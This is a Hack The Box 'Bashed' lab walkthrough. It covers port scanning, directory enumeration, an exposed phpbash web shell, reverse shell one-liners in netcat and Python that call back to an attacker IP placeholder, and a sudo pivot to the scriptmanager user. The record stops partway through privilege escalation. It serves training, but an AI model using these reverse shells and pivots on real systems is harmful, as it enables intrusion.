# Hack The Box - Bashed Walkthrough without Metasploit

## Reconnaissance
Retrieving the IP address of the machine, I started a quick inital Nmap scan to see which ports are open and which services are running on those ports.

```
┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Linux-Boxes/Bashed]
└─$ sudo nmap -sC -sV -O -oA nmap 10.10.10.68
[sudo] password for darshan: 
Starting Nmap 7.92 ( https://nmap.org ) at 2023-01-10 00:40 EST
Nmap scan report for 10.10.10.68
Host is up (0.13s latency).
Not shown: 999 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Arrexel's Development Site
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.92%E=4%D=1/10%OT=80%CT=1%CU=30919%PV=Y%DS=2%DC=I%G=Y%TM=63BCFA4
OS:F%P=x86_64-pc-linux-gnu)SEQ(SP=102%GCD=1%ISR=10D%TI=Z%CI=I%II=I%TS=8)OPS
OS:(O1=M539ST11NW7%O2=M539ST11NW7%O3=M539NNT11NW7%O4=M539ST11NW7%O5=M539ST1
OS:1NW7%O6=M539ST11)WIN(W1=7120%W2=7120%W3=7120%W4=7120%W5=7120%W6=7120)ECN
OS:(R=Y%DF=Y%T=40%W=7210%O=M539NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=A
OS:S%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R
OS:=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F
OS:=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%
OS:T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD
OS:=S)

Network Distance: 2 hops

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 25.11 seconds
```

Before starting enumeration, I ran a more comprehensive nmap scan in the background to make sure that I did not miss anything

So I ran an Nmap scan that covers all ports.

```
┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Linux-Boxes/Bashed]
└─$ sudo nmap -sC -sV -O -oA nmap 10.10.10.68
[sudo] password for darshan: 
Starting Nmap 7.92 ( https://nmap.org ) at 2023-01-10 00:40 EST
Nmap scan report for 10.10.10.68
Host is up (0.13s latency).
Not shown: 999 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Arrexel's Development Site
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.92%E=4%D=1/10%OT=80%CT=1%CU=30919%PV=Y%DS=2%DC=I%G=Y%TM=63BCFA4
OS:F%P=x86_64-pc-linux-gnu)SEQ(SP=102%GCD=1%ISR=10D%TI=Z%CI=I%II=I%TS=8)OPS
OS:(O1=M539ST11NW7%O2=M539ST11NW7%O3=M539NNT11NW7%O4=M539ST11NW7%O5=M539ST1
OS:1NW7%O6=M539ST11)WIN(W1=7120%W2=7120%W3=7120%W4=7120%W5=7120%W6=7120)ECN
OS:(R=Y%DF=Y%T=40%W=7210%O=M539NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=A
OS:S%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R
OS:=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F
OS:=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%
OS:T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD
OS:=S)

Network Distance: 2 hops
```

I got back the same results. Now I was sure that only one port was open i.e port 80

# Enumeration
Visiting the web-page at http://10.10.10.68 (defaults to port 80), I found a page decibing about `phpbash`

![b-1](https://user-images.githubusercontent.com/87711310/211477837-0ce5490a-8763-4c26-8106-966e3ce2f911.png)

The arrow on the first page leads us to `http://10.10.10.68/single.html`. There, you can find a link to a GitHub repository explaining that this is a script used to create a `semi-interactive web shell`. If we find the `phpbash.php` file, we can potentially get a `web shell`.

![b-2](https://user-images.githubusercontent.com/87711310/211477814-cd720270-1f4d-4146-9d76-d605ac431b8b.png)

After this, I ran `gobuster` to enumeration directories.

```
┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Linux-Boxes/Bashed]
└─$ gobuster dir -t 10 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u 10.10.10.68
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.10.68
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2023/01/10 00:43:07 Starting gobuster in directory enumeration mode
===============================================================
/images               (Status: 301) [Size: 311] [--> http://10.10.10.68/images/]
/uploads              (Status: 301) [Size: 312] [--> http://10.10.10.68/uploads/]
/php                  (Status: 301) [Size: 308] [--> http://10.10.10.68/php/]    
/css                  (Status: 301) [Size: 308] [--> http://10.10.10.68/css/]    
/dev                  (Status: 301) [Size: 308] [--> http://10.10.10.68/dev/]    
/js                   (Status: 301) [Size: 307] [--> http://10.10.10.68/js/]     
/fonts                (Status: 301) [Size: 310] [--> http://10.10.10.68/fonts/]  
/server-status        (Status: 403) [Size: 299]                                
===============================================================
2023/01/10 01:31:32 Finished
===============================================================
```

There were a lot directories that `gobuster` enumerated. The directories `/images`, `/uploads`, `/php`, `/css` led me nowhere. There was one more directory that caught my attention, `/dev`, so I looked into it and Voila!!! We found a `phpbash.php` scrip and clicking on it gave us a web shell.

# Gaining a foothold

Well, what exactly does this shell do and in what context does it run?

This web shell is similar to the shell we get on a machine, it runs the same commands and outputs the same results, so it can be pretty useful for gaining initial access to the machine.

```

www-data@bashed
:/var/www/html/dev# whoami

www-data
www-data@bashed
:/var/www/html/dev# ls

phpbash.min.php
phpbash.php
www-data@bashed
:/var/www/html/dev# ls -lah

total 28K
drw-r-xr-x 2 root root 4.0K Jun 2 2022 .
drw-r-xr-x 10 root root 4.0K Jun 2 2022 ..
-rw-r-xr-x 1 root root 4.6K Dec 4 2017 phpbash.min.php
-rw-r-xr-x 1 root root 8.1K Nov 30 2017 phpbash.php
www-data@bashed
:/var/www/html/dev# pwd

/var/www/html/dev
```

We’re running in the context of an Apache default user www-data. For this machine, we already have a low privileged shell that allows us to run linux commands on the web server, so we don’t necessarily need to get our own reverse shell. However, I decided to try and get a reverse shell on my own system as this is a good practise.

I used `netcat` one liner to gain a reverse shell but for some reasons it kept terminating to so decide to use a different way to gain a reverse shell

```
Attacker's Machine: nc -lvnp 444
Victim's Machine: nc -nv <Attacker's-IP> <Attacker's Port> -e /bin/sh
```

I checked if `python` existed on the target machine using `which python` command and luckily it did.

Then I just headed to [PentestMonkey's Website](http://pentestmonkey.net/) to copy a python one liner to get a reverse shell

```
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<Attacker's-IP>",<Attacker's-Port>));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

Running `netcat` on my machine and I got a reverse shell.
```
──(darshan㉿kali)-[~/Desktop/HackTheBox/Linux-Boxes/Bashed]
└─$ nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.10.14.7] from (UNKNOWN) [10.10.10.68] 38412
/bin/sh: 0: can't access tty; job control turned off
$ whoami
www-data
```

Then, as expected, I went on to retrive the user's flag by changing to `/home` directory to
view its contents

```
┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Linux-Boxes/Bashed]
└─$ nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.10.14.7] from (UNKNOWN) [10.10.10.68] 38512
/bin/sh: 0: can't access tty; job control turned off
$ whoami
www-data
$ ls
phpbash.min.php
phpbash.php
$ pwd
/var/www/html/dev
$ cd /home
$ ls
arrexel
scriptmanager
$ ls -lah
total 16K
drwxr-xr-x  4 root          root          4.0K Dec  4  2017 .
drwxr-xr-x 23 root          root          4.0K Jun  2  2022 ..
drwxr-xr-x  4 arrexel       arrexel       4.0K Jun  2  2022 arrexel
drwxr-xr-x  3 scriptmanager scriptmanager 4.0K Dec  4  2017 scriptmanager
$ 

```

Visiting `/arrexel` directory, I found `user.txt` flag
```
$ ls
arrexel
scriptmanager
$ cd arrexel
$ ls
user.txt
$ cat user.txt
[REDACTED]
```

## Privilege Escalation
Next up, to obtain the `root` flag

I used `sudo -l` to find out which commands I could run as a `sudo` user.

```
$ sudo -l
Matching Defaults entries for www-data on bashed:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on bashed:
    (scriptmanager : scriptmanager) NOPASSWD: ALL

```
The last two lines are particularly interesting because they say that the user I’m running in the context of (www-data) can run as the user scriptmanager without having to provide the user’s password. This might come in handy later on.

For the time being, let’s do some more enumeration.

```
$ cd .../../../../../
$ ls
bin
boot
dev
etc
home
initrd.img
lib
lib64
lost+found
media
mnt
opt
proc
root
run
sbin
scripts
srv
sys
tmp
usr
var
vmlinuz

```

Everything in the root directory seemed to be owned by root, except for the `/scripts` which is owned by `scriptmanager`.  In the previous step we found out that we can run as scriptmanager without a password.

```
sudo -i -u scriptmanager
```

The above command changes the user to scriptmanager.
```
$ sudo -i -u scriptmanager
whoami
scriptmanager
```

Now that we’re running in the context of scriptmanager, we have read/write/execute privileges in the scripts directory.

We have two files; one owned by us (test.py) and the other owned by root (test.txt). Let’s print out the content of test.py.

```
cd /scripts          
ls
test.py
test.txt
```

